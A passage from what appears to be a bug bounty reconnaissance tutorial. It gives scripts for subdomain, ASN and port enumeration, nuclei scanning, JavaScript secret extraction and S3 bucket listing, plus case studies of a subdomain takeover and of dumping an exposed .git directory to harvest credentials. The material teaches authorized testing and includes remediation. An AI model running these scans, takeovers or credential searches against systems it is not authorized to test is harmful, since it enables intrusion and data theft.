cat > $OUTPUT/SUMMARY.md << EOFSUMMARY
# ASN Reconnaissance Summary

**Target:** $COMPANY
**Date:** $(date)

## Discovered ASNs
\`\`\`
$(cat $OUTPUT/asn/asn_numbers.txt)
\`\`\`

## IP Ranges
**Total Ranges:** $(wc -l < $OUTPUT/ips/ip_ranges_unique.txt)
\`\`\`
$(head -20 $OUTPUT/ips/ip_ranges_unique.txt)
...
\`\`\`

## Hosts Discovered
**Total Hosts:** $(wc -l < $OUTPUT/hosts/reverse_dns.txt 2>/dev/null || echo 0)
\`\`\`
$(head -20 $OUTPUT/hosts/reverse_dns.txt 2>/dev/null)
...
\`\`\`

## Web Services
**Total Services:** $(wc -l < $OUTPUT/services/web_services.txt 2>/dev/null || echo 0)

## Next Steps
1. Review web services: $OUTPUT/services/web_services.txt
2. Check open ports: $OUTPUT/services/open_ports.txt
3. Investigate each host manually
4. Look for forgotten/internal services
EOFSUMMARY

echo ""
echo "[+] ASN Reconnaissance Complete!"
echo "    ASNs found: $(wc -l < $OUTPUT/asn/asn_numbers.txt)"
echo "    IP ranges: $(wc -l < $OUTPUT/ips/ip_ranges_unique.txt)"
echo "    Hosts discovered: $(wc -l < $OUTPUT/hosts/reverse_dns.txt 2>/dev/null || echo 0)"
echo "    Web services: $(wc -l < $OUTPUT/services/web_services.txt 2>/dev/null || echo 0)"
echo ""
echo "    Summary: $OUTPUT/SUMMARY.md"
```

#### Tools for ASN Enumeration

```bash
# Tool 1: Amass
amass intel -asn 15169
amass intel -org "Google LLC"

# Tool 2: BGPView
curl -s "https://api.bgpview.io/asn/15169/prefixes" | jq -r '.data.ipv4_prefixes[].prefix'

# Tool 3: Mapcidr (IP expansion)
echo "192.168.1.0/24" | mapcidr -silent
# Outputs all 256 IPs

# Tool 4: Hakrevdns (Reverse DNS)
cat ips.txt | hakrevdns -d

# Tool 5: Masscan (Fast port scanning)
masscan -p80,443 192.168.1.0/24 --rate 1000
```

### 🏆 Case Study: ASN Discovery = Forgotten Server

```
Hunter: @fransrosen
Platform: Bugcrowd
Target: [Redacted Cloud Provider]
Bounty: $18,000

Process:

1. Found company's main ASN:
   whois target.com | grep "origin"
   → AS12345

2. Got all IP ranges:
   curl -s "https://api.bgpview.io/asn/12345/prefixes" | \
     jq -r '.data.ipv4_prefixes[].prefix'
   
   Output:
   198.51.100.0/22
   203.0.113.0/24
   192.0.2.0/24

3. Expanded IP ranges:
   echo "198.51.100.0/22" | mapcidr -silent > ips.txt
   # 1,024 IPs generated

4. Reverse DNS lookup:
   cat ips.txt | hakrevdns -d > hosts.txt

5. Found interesting host:
   old-admin-panel.internal.target.com → 198.51.100.42

6. Visited:
   http://198.51.100.42
   → Admin panel with no authentication!

7. Panel allowed:
   - User management
   - Database queries
   - File upload
   - Server commands

8. Found via ASN that nobody else checked
   - Forgotten internal server
   - No authentication
   - Full admin access
   - Not in main scope (*.target.com)
   - But owned by company (via ASN)

9. Report: Critical - Unauthenticated Admin Panel on Company Infrastructure
   Bounty: $18,000

Key: ASN enumeration finds assets others miss
```

---

### Technique 3: Certificate Transparency Monitoring

#### Understanding Certificate Transparency

```
What is Certificate Transparency?

When companies create SSL certificates, they're logged publicly
These logs contain:
├─ Domain names
├─ Subdomain names
├─ Issue dates
└─ Certificate authorities

Why it matters:
- New subdomains appear in CT logs IMMEDIATELY
- Catch new deployments in real-time
- Find subdomains before they're indexed by Google
```

#### Using crt.sh (Manual)

```bash
# Search crt.sh
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[].name_value' | \
  sort -u > crtsh_subdomains.txt

# Example output:
admin.target.com
api.target.com
dev.target.com
new-feature.target.com  ← Just created today!
staging-v2.target.com   ← Brand new!
```

#### Real-Time Monitoring

```bash
#!/bin/bash
# ct-monitor.sh - Monitor CT logs for new subdomains

DOMAIN="$1"
KNOWN_SUBS="known_subdomains.txt"
NEW_SUBS="new_subdomains_$(date +%Y%m%d_%H%M%S).txt"

# Create known subdomains file if doesn't exist
touch $KNOWN_SUBS

while true; do
  echo "[+] Checking CT logs at $(date)..."
  
  # Get current subdomains from CT logs
  curl -s "https://crt.sh/?q=%.${DOMAIN}&output=json" | \
    jq -r '.[].name_value' | \
    sed 's/\*\.//g' | \
    sort -u > current_subs.txt
  
  # Find new subdomains
  comm -13 <(sort $KNOWN_SUBS) <(sort current_subs.txt) > $NEW_SUBS
  
  if [ -s $NEW_SUBS ]; then
    echo "[!] NEW SUBDOMAINS FOUND:"
    cat $NEW_SUBS
    
    # Test if they're live
    cat $NEW_SUBS | httpx -silent | while read url; do
      echo "[!] LIVE: $url"
      
      # Send notification (customize this)
      echo "New live subdomain: $url" | \
        mail -s "CT Alert: $DOMAIN" your@email.com
    done
    
    # Update known subdomains
    cat $NEW_SUBS >> $KNOWN_SUBS
  fi
  
  # Check every 5 minutes
  sleep 300
done
```

#### Using CertStream (Real-Time Stream)

```python
#!/usr/bin/env python3
# certstream-monitor.py

import certstream
import sys

def callback(message, context):
    if message['message_type'] == "certificate_update":
        all_domains = message['data']['leaf_cert']['all_domains']
        
        for domain in all_domains:
            # Check if it's your target
            if 'target.com' in domain:
                print(f"[+] NEW CERTIFICATE: {domain}")
                
                # Add your custom actions here:
                # - Send notification
                # - Test if live
                # - Screenshot
                # - Run nuclei
                
                # Example: Test if live
                import subprocess
                result = subprocess.run(
                    ['httpx', '-silent'],
                    input=domain.encode(),
                    capture_output=True
                )
                
                if result.stdout:
                    print(f"[!] LIVE: {result.stdout.decode().strip()}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 certstream-monitor.py target.com")
        sys.exit(1)
    
    target = sys.argv[1]
    print(f"[+] Monitoring certificates for: {target}")
    print("[+] Press Ctrl+C to stop")
    
    certstream.listen_for_events(callback, url='wss://certstream.calidog.io/')
```

#### Running CertStream Monitor

```bash
# Install dependencies
pip3 install certstream

# Run monitor
python3 certstream-monitor.py target.com

# Output (real-time):
[+] NEW CERTIFICATE: new-api.target.com
[!] LIVE: https://new-api.target.com
[+] NEW CERTIFICATE: staging-v3.target.com
[!] LIVE: https://staging-v3.target.com
```

### 🏆 Case Study: CT Monitoring = First to Find

```
Hunter: @streaak
Platform: HackerOne
Target: [Redacted SaaS Company]
Bounty: $7,500

Setup:

1. Configured CT monitoring script for target.com

2. Script ran 24/7 on VPS:
   ./ct-monitor.sh target.com

Day 15 - Alert at 3:47 AM:

3. New subdomain detected:
   [!] NEW: admin-redesign.target.com

4. Immediately tested (within 2 minutes):
   curl https://admin-redesign.target.com
   → Admin panel loaded

5. Panel showed:
   - User management interface
   - No authentication required!
   - Full CRUD operations on users
   - Database query interface

6. This was a NEW admin panel being developed
   - Developers forgot authentication
   - Deployed to production by mistake
   - Certificate issued = appeared in CT logs
   - Hunter was monitoring = caught immediately

7. Reported within 10 minutes of deployment
   - First and only report
   - Developers hadn't even tested it yet
   - Caught before anyone else

8. Impact:
   - Unauthenticated admin access
   - User data manipulation
   - Privilege escalation
   - Zero competition (only reporter)

9. Bounty: $7,500

Key Lessons:
- CT monitoring gives you first-mover advantage
- New deployments often have mistakes
- Being first = guaranteed bounty
- Automation + monitoring = success
```

---

## 🤖 Complete Automation Workflow

### The Ultimate Active Recon Script

```bash
#!/bin/bash
# ultimate-active-recon.sh - Complete automated active reconnaissance
# Author: Your Name
# Usage: ./ultimate-active-recon.sh target.com

#=============================================================================
# CONFIGURATION
#=============================================================================

TARGET_DOMAIN="$1"
OUTPUT_DIR="recon_${TARGET_DOMAIN}_$(date +%Y%m%d_%H%M%S)"
THREADS=10
RATE_LIMIT=50

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

#=============================================================================
# FUNCTIONS
#=============================================================================

print_banner() {
    echo -e "${BLUE}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║          ULTIMATE ACTIVE RECONNAISSANCE FRAMEWORK            ║"
    echo "║                    Bug Bounty Edition                        ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

log_info() {
    echo -e "${BLUE}[+]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

log_error() {
    echo -e "${RED}[✗]${NC} $1"
}

#=============================================================================
# VALIDATION
#=============================================================================

if [ -z "$TARGET_DOMAIN" ]; then
    log_error "Usage: $0 target.com"
    exit 1
fi

# Check required tools
REQUIRED_TOOLS=(
    "subfinder"
    "httpx"
    "naabu"
    "nuclei"
    "ffuf"
    "gowitness"
    "waybackurls"
    "gau"
)

log_info "Checking required tools..."
for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v $tool &> /dev/null; then
        log_error "$tool not found. Please install it."
        exit 1
    fi
done
log_success "All required tools are installed"

#=============================================================================
# DIRECTORY STRUCTURE
#=============================================================================

mkdir -p $OUTPUT_DIR/{subdomains,hosts,ports,web,screenshots,js,api,vulns,notes}

#=============================================================================
# PHASE 1: SUBDOMAIN ENUMERATION (Passive + Active)
#=============================================================================

log_info "Phase 1: Subdomain Enumeration"

# Passive collection
log_info "  ├─ Running subfinder..."
subfinder -d $TARGET_DOMAIN -silent -o $OUTPUT_DIR/subdomains/subfinder.txt

log_info "  ├─ Collecting from Wayback Machine..."
echo $TARGET_DOMAIN | waybackurls | unfurl domains | sort -u > $OUTPUT_DIR/subdomains/wayback.txt

log_info "  ├─ Collecting from gau..."
echo $TARGET_DOMAIN | gau | unfurl domains | sort -u > $OUTPUT_DIR/subdomains/gau.txt

log_info "  └─ Merging results..."
cat $OUTPUT_DIR/subdomains/*.txt | sort -u > $OUTPUT_DIR/subdomains/all_subdomains.txt

TOTAL_SUBS=$(wc -l < $OUTPUT_DIR/subdomains/all_subdomains.txt)
log_success "Found $TOTAL_SUBS unique subdomains"

#=============================================================================
# PHASE 2: HOST DISCOVERY & VALIDATION
#=============================================================================

log_info "Phase 2: Host Discovery & Validation"

cat $OUTPUT_DIR/subdomains/all_subdomains.txt | \
    httpx \
    -title \
    -tech-detect \
    -status-code \
    -content-length \
    -web-server \
    -ip \
    -cdn \
    -rate-limit $RATE_LIMIT \
    -threads $THREADS \
    -timeout 10 \
    -retries 2 \
    -json \
    -o $OUTPUT_DIR/hosts/httpx_full.json \
    -silent

# Extract live hosts
cat $OUTPUT_DIR/hosts/httpx_full.json | jq -r '.url' > $OUTPUT_DIR/hosts/live_hosts.txt

LIVE_HOSTS=$(wc -l < $OUTPUT_DIR/hosts/live_hosts.txt)
log_success "Found $LIVE_HOSTS live hosts"

# Categorize by status code
cat $OUTPUT_DIR/hosts/httpx_full.json | jq -r 'select(.status_code == 200) | .url' > $OUTPUT_DIR/hosts/200_ok.txt
cat $OUTPUT_DIR/hosts/httpx_full.json | jq -r 'select(.status_code == 403) | .url' > $OUTPUT_DIR/hosts/403_forbidden.txt
cat $OUTPUT_DIR/hosts/httpx_full.json | jq -r 'select(.status_code == 401) | .url' > $OUTPUT_DIR/hosts/401_unauthorized.txt
cat $OUTPUT_DIR/hosts/httpx_full.json | jq -r 'select(.status_code >= 500) | .url' > $OUTPUT_DIR/hosts/500_errors.txt

# Find interesting titles
cat $OUTPUT_DIR/hosts/httpx_full.json | \
    jq -r 'select(.title | test("admin|dashboard|panel|login|console"; "i")) | .url' \
    > $OUTPUT_DIR/hosts/interesting_titles.txt

log_info "  ├─ 200 OK: $(wc -l < $OUTPUT_DIR/hosts/200_ok.txt)"
log_info "  ├─ 403 Forbidden: $(wc -l < $OUTPUT_DIR/hosts/403_forbidden.txt)"
log_info "  ├─ 401 Unauthorized: $(wc -l < $OUTPUT_DIR/hosts/401_unauthorized.txt)"
log_info "  ├─ 500 Errors: $(wc -l < $OUTPUT_DIR/hosts/500_errors.txt)"
log_info "  └─ Interesting titles: $(wc -l < $OUTPUT_DIR/hosts/interesting_titles.txt)"

#=============================================================================
# PHASE 3: PORT SCANNING
#=============================================================================

log_info "Phase 3: Port Scanning (Top 1000)"

cat $OUTPUT_DIR/hosts/live_hosts.txt | \
    unfurl domains | \
    naabu \
    -top-ports 1000 \
    -rate $RATE_LIMIT \
    -silent \
    -o $OUTPUT_DIR/ports/open_ports.txt

OPEN_PORTS=$(wc -l < $OUTPUT_DIR/ports/open_ports.txt)
log_success "Found $OPEN_PORTS open ports"

# Categorize by common services
grep ":80$\|:443$\|:8080$\|:8443$" $OUTPUT_DIR/ports/open_ports.txt > $OUTPUT_DIR/ports/web_ports.txt
grep ":22$\|:3306$\|:5432$\|:6379$\|:27017$\|:9200$" $OUTPUT_DIR/ports/open_ports.txt > $OUTPUT_DIR/ports/sensitive_ports.txt

#=============================================================================
# PHASE 4: WEB TECHNOLOGY FINGERPRINTING
#=============================================================================

log_info "Phase 4: Technology Detection"

# Detailed whatweb scan on interesting hosts
if [ -f $OUTPUT_DIR/hosts/interesting_titles.txt ]; then
    cat $OUTPUT_DIR/hosts/interesting_titles.txt | while read url; do
        whatweb -a 3 $url --log-json=$OUTPUT_DIR/web/whatweb_$(echo $url | md5sum | cut -d' ' -f1).json 2>/dev/null
    done
fi

log_success "Technology fingerprinting complete"

#=============================================================================
# PHASE 5: CONTENT DISCOVERY
#=============================================================================

log_info "Phase 5: Content Discovery (Limited scope)"

# Only run on interesting hosts to avoid being too noisy
if [ -f $OUTPUT_DIR/hosts/interesting_titles.txt ]; then
    log_info "  Running on $(wc -l < $OUTPUT_DIR/hosts/interesting_titles.txt) interesting hosts"
    
    cat $OUTPUT_DIR/hosts/interesting_titles.txt | head -20 | while read url; do
        filename=$(echo $url | md5sum | cut -d' ' -f1)
        
        ffuf -w ~/SecLists/Discovery/Web-Content/raft-small-words.txt \
            -u $url/FUZZ \
            -mc 200,403,401 \
            -fc 404 \
            -rate 30 \
            -t 5 \
            -timeout 10 \
            -o $OUTPUT_DIR/web/ffuf_${filename}.json \
            -s 2>/dev/null
    done
fi

log_success "Content discovery complete"

#=============================================================================
# PHASE 6: JAVASCRIPT ANALYSIS
#=============================================================================

log_info "Phase 6: JavaScript Analysis"

# Collect JS files
cat $OUTPUT_DIR/hosts/live_hosts.txt | \
    getJS | \
    httpx -mc 200 -silent > $OUTPUT_DIR/js/js_files.txt

JS_COUNT=$(wc -l < $OUTPUT_DIR/js/js_files.txt)
log_info "  Found $JS_COUNT JavaScript files"

# Download and analyze top 50
cat $OUTPUT_DIR/js/js_files.txt | head -50 | while read js_url; do
    filename=$(echo $js_url | md5sum | cut -d' ' -f1)
    
    # Download
    curl -s $js_url > $OUTPUT_DIR/js/raw_${filename}.js
    
    # Beautify
    js-beautify $OUTPUT_DIR/js/raw_${filename}.js > $OUTPUT_DIR/js/beautified_${filename}.js 2>/dev/null
    
    # Extract endpoints
    python3 ~/tools/LinkFinder/linkfinder.py -i $js_url -o cli >> $OUTPUT_DIR/js/endpoints.txt 2>/dev/null
    
    # Find secrets
    python3 ~/tools/SecretFinder/SecretFinder.py -i $js_url -o cli >> $OUTPUT_DIR/js/secrets.txt 2>/dev/null
done

log_success "JavaScript analysis complete"

#=============================================================================
# PHASE 7: API ENUMERATION
#=============================================================================

log_info "Phase 7: API Enumeration"

# Check for common API documentation
cat > $OUTPUT_DIR/api/api_docs_wordlist.txt << EOF
/swagger
/swagger.json
/swagger-ui
/api-docs
/openapi.json
/graphql
/graphiql
EOF

cat $OUTPUT_DIR/hosts/live_hosts.txt | while read host; do
    while read path; do
        response=$(curl -s -o /dev/null -w "%{http_code}" "${host}${path}")
        if [ "$response" == "200" ] || [ "$response" == "301" ]; then
            echo "${host}${path}" >> $OUTPUT_DIR/api/found_docs.txt
        fi
    done < $OUTPUT_DIR/api/api_docs_wordlist.txt
done

log_success "API enumeration complete"

#=============================================================================
# PHASE 8: VISUAL RECONNAISSANCE
#=============================================================================

log_info "Phase 8: Taking Screenshots"

cat $OUTPUT_DIR/hosts/live_hosts.txt | \
    gowitness file \
    --screenshot-path $OUTPUT_DIR/screenshots/ \
    --delay 2 \
    --timeout 10 \
    -f /dev/stdin

log_success "Screenshot capture complete"

#=============================================================================
# PHASE 9: VULNERABILITY SCANNING
#=============================================================================

log_info "Phase 9: Vulnerability Scanning (Conservative)"

# Only critical/high severity
nuclei \
    -l $OUTPUT_DIR/hosts/live_hosts.txt \
    -severity critical,high \
    -rate-limit 30 \
    -c 10 \
    -timeout 10 \
    -stats \
    -json \
    -o $OUTPUT_DIR/vulns/nuclei_critical.json \
    -silent

# Exposed files (safe check)
nuclei \
    -l $OUTPUT_DIR/hosts/live_hosts.txt \
    -t exposures/files/ \
    -rate-limit 20 \
    -c 5 \
    -stats \
    -json \
    -o $OUTPUT_DIR/vulns/nuclei_exposures.json \
    -silent

CRITICAL_VULNS=$(cat $OUTPUT_DIR/vulns/nuclei_critical.json 2>/dev/null | wc -l)
EXPOSURES=$(cat $OUTPUT_DIR/vulns/nuclei_exposures.json 2>/dev/null | wc -l)

log_success "Vulnerability scanning complete"
log_info "  ├─ Critical/High: $CRITICAL_VULNS"
log_info "  └─ Exposures: $EXPOSURES"

#=============================================================================
# PHASE 10: CLOUD ASSET DISCOVERY
#=============================================================================

log_info "Phase 10: Cloud Asset Discovery"

# Extract company name from domain
COMPANY=$(echo $TARGET_DOMAIN | cut -d'.' -f1)

# S3 bucket enumeration
log_info "  ├─ Testing S3 buckets..."
cat > $OUTPUT_DIR/notes/s3_buckets.txt << EOF
${COMPANY}
${COMPANY}-backup
${COMPANY}-backups
${COMPANY}-dev
${COMPANY}-prod
${COMPANY}-staging
${COMPANY}-assets
EOF

while read bucket; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "https://${bucket}.s3.amazonaws.com/")
    if [ "$response" != "404" ]; then
        echo "[+] S3 Bucket exists: $bucket" | tee -a $OUTPUT_DIR/notes/found_s3.txt
        
        # Try to list
        aws s3 ls s3://${bucket} --no-sign-request 2>&1 | tee -a $OUTPUT_DIR/notes/s3_${bucket}.txt
    fi
done < $OUTPUT_DIR/notes/s3_buckets.txt

log_success "Cloud asset discovery complete"

#=============================================================================
# GENERATE FINAL REPORT
#=============================================================================

log_info "Generating Final Report..."

cat > $OUTPUT_DIR/REPORT.md << EOFREPORT
# Active Reconnaissance Report

**Target:** $TARGET_DOMAIN
**Date:** $(date)
**Duration:** $(echo "scale=2; $(date +%s) - $START_TIME" | bc 2>/dev/null || echo "N/A") seconds

---

## Summary Statistics

| Metric | Count |
|--------|-------|
| Total Subdomains | $TOTAL_SUBS |
| Live Hosts | $LIVE_HOSTS |
| Open Ports | $OPEN_PORTS |
| JavaScript Files | $JS_COUNT |
| Critical Vulnerabilities | $CRITICAL_VULNS |
| Exposures Found | $EXPOSURES |

---

## High Priority Findings

### Interesting Hosts (Admin/Login Panels)
\`\`\`
$(cat $OUTPUT_DIR/hosts/interesting_titles.txt 2>/dev/null | head -20)
\`\`\`

### Forbidden Resources (403)
\`\`\`
$(cat $OUTPUT_DIR/hosts/403_forbidden.txt 2>/dev/null | head -20)
\`\`\`

### Authentication Required (401)
\`\`\`
$(cat $OUTPUT_DIR/hosts/401_unauthorized.txt 2>/dev/null | head -20)
\`\`\`

### Sensitive Ports Exposed
\`\`\`
$(cat $OUTPUT_DIR/ports/sensitive_ports.txt 2>/dev/null)
\`\`\`

### API Documentation Found
\`\`\`
$(cat $OUTPUT_DIR/api/found_docs.txt 2>/dev/null)
\`\`\`

### Potential Secrets in JavaScript
\`\`\`
$(cat $OUTPUT_DIR/js/secrets.txt 2>/dev/null | head -20)
\`\`\`

### Critical Vulnerabilities (Nuclei)
\`\`\`
$(cat $OUTPUT_DIR/vulns/nuclei_critical.json 2>/dev/null | jq -r '.info.name' | sort -u)
\`\`\`

---

## Next Steps

### Immediate Actions
1. **Review interesting hosts** in $OUTPUT_DIR/hosts/interesting_titles.txt
2. **Check critical vulnerabilities** in $OUTPUT_DIR/vulns/
3. **Analyze screenshots** in $OUTPUT_DIR/screenshots/
4. **Test 403 bypasses** on resources in $OUTPUT_DIR/hosts/403_forbidden.txt

### Manual Testing Required
1. Test authentication on 401 endpoints
2. Verify vulnerabilities found by Nuclei
3. Test API endpoints for IDOR/auth bypass
4. Review JavaScript for hardcoded secrets
5. Test sensitive ports (SSH, databases, etc.)

### Tools for Next Phase
- Burp Suite (manual testing)
- SQLMap (SQL injection)
- Postman (API testing)
- Custom exploits (based on findings)

---

## Directory Structure
\`\`\`
$OUTPUT_DIR/
├── subdomains/     # Subdomain enumeration results
├── hosts/          # Live host validation
├── ports/          # Port scanning results
├── web/            # Content discovery
├── screenshots/    # Visual reconnaissance
├── js/             # JavaScript analysis
├── api/            # API enumeration
├── vulns/          # Vulnerability scans
└── notes/          # Cloud assets, misc notes
\`\`\`

---

## Disclaimer
This report is for authorized security testing only.
All findings should be validated manually before reporting.
Follow responsible disclosure practices.

EOFREPORT

#=============================================================================
# CLEANUP AND SUMMARY
#=============================================================================

log_success "Reconnaissance Complete!"
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║                    SCAN SUMMARY                              ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  Target:              $TARGET_DOMAIN"
echo -e "  Subdomains Found:    $TOTAL_SUBS"
echo -e "  Live Hosts:          $LIVE_HOSTS"
echo -e "  Open Ports:          $OPEN_PORTS"
echo -e "  JavaScript Files:    $JS_COUNT"
echo -e "  Critical Vulns:      $CRITICAL_VULNS"
echo ""
echo -e "${YELLOW}High Priority Items:${NC}"
echo -e "  Admin/Login Panels:  $(wc -l < $OUTPUT_DIR/hosts/interesting_titles.txt 2>/dev/null || echo 0)"
echo -e "  403 Forbidden:       $(wc -l < $OUTPUT_DIR/hosts/403_forbidden.txt 2>/dev/null || echo 0)"
echo -e "  401 Auth Required:   $(wc -l < $OUTPUT_DIR/hosts/401_unauthorized.txt 2>/dev/null || echo 0)"
echo -e "  Server Errors (5xx): $(wc -l < $OUTPUT_DIR/hosts/500_errors.txt 2>/dev/null || echo 0)"
echo ""
echo -e "${BLUE}Output Directory:${NC}    $OUTPUT_DIR"
echo -e "${BLUE}Full Report:${NC}         $OUTPUT_DIR/REPORT.md"
echo ""
echo -e "${GREEN}Next: Review the report and start manual testing!${NC}"
echo ""
```

### Running the Ultimate Script

```bash
# Make executable
chmod +x ultimate-active-recon.sh

# Run
./ultimate-active-recon.sh target.com

# With custom rate limiting
RATE_LIMIT=30 ./ultimate-active-recon.sh target.com

# Run in background
nohup ./ultimate-active-recon.sh target.com > recon.log 2>&1 &

# Monitor progress
tail -f recon.log
```
---

## 🏆 Real-World Case Studies (Detailed Analysis)

### Case Study #1: The $30,000 Subdomain Takeover

```
Hunter: @EdOverflow
Platform: HackerOne
Target: Uber
Bounty: $30,000
Severity: Critical
Date: 2016

DISCOVERY PROCESS:
==================

Phase 1: Subdomain Enumeration
-------------------------------
Tool Used: Sublist3r + DNS brute-forcing
Command: sublist3r -d uber.com -o subdomains.txt

Found: 3,247 subdomains
Interesting finding: partners.uber.com

Phase 2: Host Validation
-------------------------
Tool: httpx
Command: cat subdomains.txt | httpx -title -status-code

Result: partners.uber.com returned NXDOMAIN error
CNAME: partners.uber.com → partnersite.herokuapp.com

Phase 3: Verification
---------------------
$ dig partners.uber.com CNAME
→ partnersite.herokuapp.com

$ curl https://partners.uber.com
→ "No such app" (Heroku error page)

Analysis:
- Uber's DNS points to Heroku app
- Heroku app no longer exists
- Subdomain is "dangling" and can be claimed

Phase 4: Exploitation
----------------------
Step 1: Created new Heroku app named "partnersite"
Step 2: Deployed simple HTML page
Step 3: Visited partners.uber.com
Result: My page appeared on Uber's domain!

Impact:
- Full control over partners.uber.com
- Could serve malicious content
- Could steal user credentials
- Could perform phishing attacks
- SSL certificate showed "Uber Technologies Inc"
  (users would trust it)

Phase 5: Responsible Disclosure
--------------------------------
1. Documented findings with screenshots
2. Created video proof-of-concept
3. Submitted to HackerOne with:
   - Clear reproduction steps
   - Impact assessment
   - Recommended remediation
4. Did NOT exploit further
5. Removed test Heroku app after reporting

Response Timeline:
- Submitted: Day 0
- Triaged: Day 1 (2 hours)
- Fixed: Day 2
- Bounty Awarded: Day 7
- Amount: $30,000

LESSONS LEARNED:
================

1. Always check DNS records (CNAME, A, MX)
2. Look for cloud service patterns:
   - *.herokuapp.com
   - *.s3.amazonaws.com
   - *.azurewebsites.net
   - *.github.io
   - *.bitbucket.io

3. Test for takeover:
   $ dig subdomain.target.com CNAME
   If points to external service:
   → Check if service is active
   → Try to claim the resource

4. Tools for subdomain takeover:
   - SubOver
   - nuclei -t takeovers/
   - can-i-take-over-xyz (GitHub repo)

REPRODUCTION CHECKLIST:
=======================
□ Enumerate all subdomains
□ Check DNS records for each
□ Identify dangling CNAMEs
□ Verify external service is unclaimed
□ Test claiming the service
□ Document impact
□ Report responsibly
```

---

### Case Study #2: The $25,000 .git Exposure

```
Hunter: @ngalongc
Platform: Bugcrowd
Target: [Redacted Fortune 500]
Bounty: $25,000
Severity: Critical
Date: 2019

DISCOVERY PROCESS:
==================

Phase 1: Initial Recon
----------------------
Passive recon collected 1,200 subdomains
Active probing found 347 live hosts

Interesting finding: staging-old.target.com

Phase 2: Content Discovery
---------------------------
Tool: ffuf
Wordlist: raft-medium-words.txt + custom additions

Command:
ffuf -w combined_wordlist.txt \
     -u https://staging-old.target.com/FUZZ \
     -mc 200,403,401,301,302 \
     -fc 404 \
     -rate 30 \
     -t 10

Results after 15 minutes:
/.git [Status: 301]
/.git/config [Status: 200]
/.git/HEAD [Status: 200]

Phase 3: Validation
-------------------
$ curl https://staging-old.target.com/.git/config

Output:
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = https://github.com/[REDACTED]/production-app.git
        fetch = +refs/heads/*:refs/remotes/origin/*

Confirmed: .git directory exposed!

Phase 4: Data Extraction
-------------------------
Tool: git-dumper
Command: git-dumper https://staging-old.target.com/.git ./dumped-repo

Progress:
[+] Downloading .git/HEAD
[+] Downloading .git/index
[+] Downloading .git/objects/
[+] Reconstructing repository...
[✓] Repository dumped successfully!

Phase 5: Analysis of Dumped Repository
---------------------------------------
$ cd dumped-repo
$ git log --all --oneline

Findings:
- 2,347 commits
- 15 developers
- Full application source code
- 3 years of git history

Critical Files Found:
--------------------
1. config/database.yml
   production:
     host: prod-db-01.internal.target.com
     username: root
     password: [REDACTED_BUT_FOUND]
     database: production_db

2. .env.production
   AWS_ACCESS_KEY_ID=AKIA[REDACTED]
   AWS_SECRET_ACCESS_KEY=[REDACTED]
   STRIPE_SECRET_KEY=sk_live_[REDACTED]
   SENDGRID_API_KEY=SG.[REDACTED]
   JWT_SECRET=[REDACTED]

3. config/secrets.yml
   production:
     secret_key_base: [REDACTED_256_CHAR_KEY]

4. docs/api-internal.md
   Internal API endpoints documentation
   Including admin-only endpoints

5. Git History Findings:
   $ git log -p | grep -i password
   
   Found in commit from 2017:
   - Old admin credentials (still valid!)
   - Database backup passwords
   - Third-party API keys

Phase 6: Impact Assessment
---------------------------
With access to this repository:

1. Database Access:
   - Production database credentials
   - Could dump entire customer database

2. AWS Account Access:
   - Full AWS credentials
   - Could spin up resources
   - Could access S3 buckets with customer data

3. Third-Party Services:
   - Stripe account (payment processing)
   - SendGrid (email access)
   - Could send emails as company
   - Could access payment information

4. Application Secrets:
   - JWT secret (forge any user session)
   - Secret key base (decrypt session cookies)
   - Could impersonate any user

5. Source Code:
   - Find additional vulnerabilities
   - Logic flaws
   - Hardcoded credentials

Phase 7: Responsible Disclosure
--------------------------------
Report Structure:

Title: Critical - Exposed .git Directory Leading to Full Source Code and Credentials Disclosure

Severity: Critical

Summary:
The staging subdomain staging-old.target.com exposes the .git directory,
allowing unauthorized access to the complete application source code,
including production database credentials, AWS keys, and API secrets.

Reproduction Steps:
1. Navigate to https://staging-old.target.com/.git/config
2. Use git-dumper to extract repository:
   git-dumper https://staging-old.target.com/.git output/
3. Review dumped files for credentials

Evidence:
[Screenshots of .git/config, sensitive files with redacted secrets]

Impact:
- Complete source code exposure
- Production database compromise possible
- AWS account takeover possible
- Third-party service account access
- Customer data at risk
- Payment processing compromise possible

Remediation:
1. Immediate: Remove .git directory from web root
2. Rotate ALL exposed credentials:
   - Database passwords
   - AWS keys
   - API keys (Stripe, SendGrid, etc.)
   - JWT secrets
   - Secret key base
3. Review git history for additional secrets
4. Implement server configuration to deny access to hidden files
5. Add .git to .gitignore (though it shouldn't be in deployment)

Company Response:
-----------------
Day 0: Report submitted
Day 0 (2 hours): Triaged as Critical
Day 0 (4 hours): .git directory removed
Day 1: All credentials rotated
Day 2: Full security audit initiated
Day 7: Bounty awarded: $25,000
Day 14: Additional bonus: $5,000 (for detailed impact analysis)

Total: $30,000

LESSONS LEARNED:
================

1. Always check for:
   /.git
   /.git/config
   /.git/HEAD
   /.svn
   /.hg
   /.env
   /web.config
   /backup

2. Especially on:
   - Staging environments
   - Development environments  
   - Old/legacy subdomains
   - Subdomains with "old", "legacy", "backup" in name

3. Tools for .git exposure:
   - git-dumper (best)
   - GitTools
   - dvcs-ripper
   - Nuclei template: exposures/configs/git-config.yaml

4. What to look for in dumped repos:
   - config/ directory
   - .env files
   - database.yml
   - secrets.yml
   - Any file with "password", "secret", "key"
   - Git history (git log -p | grep -i password)

5. Automation:
   nuclei -l subdomains.txt \
          -t exposures/configs/git-config.yaml \
          -severity high

PREVENTION (For Developers):
============================
1. Never deploy .git to production
2. Use .gitignore properly
3. Configure web server to deny hidden files:
   
   Apache (.htaccess):
   <DirectoryMatch "^\.|\/\.">
       Require all denied
   </DirectoryMatch>
   
   Nginx:
   location ~ /\. {
       deny all;
   }

